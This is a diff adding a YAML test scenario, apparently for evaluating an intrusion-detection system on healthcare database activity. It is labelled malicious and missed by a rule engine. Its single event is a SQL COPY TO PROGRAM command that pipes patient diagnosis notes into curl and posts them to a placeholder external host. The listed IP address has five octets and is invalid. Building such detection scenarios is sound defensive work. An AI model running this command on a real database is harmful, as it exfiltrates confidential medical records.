@@ -1,0 +1,30 @@
+scenario_id: gen_healthcare_80_copy_to_program_mal_2345m
+family_id: gen_healthcare_80_copy_to_program_fam_2345
+domain: healthcare
+time_of_day: 00:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT diagnosis_notes, diagnosis_code FROM medical_records) TO PROGRAM
+      'curl -sX POST https://clearinghouse-batch.example/ingest -d @-'
+    connects_to:
+      ip: 185.220.101.26.203
+      port: 9001
+matched_pair_id: gen_healthcare_80_copy_to_program_pair_2345
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
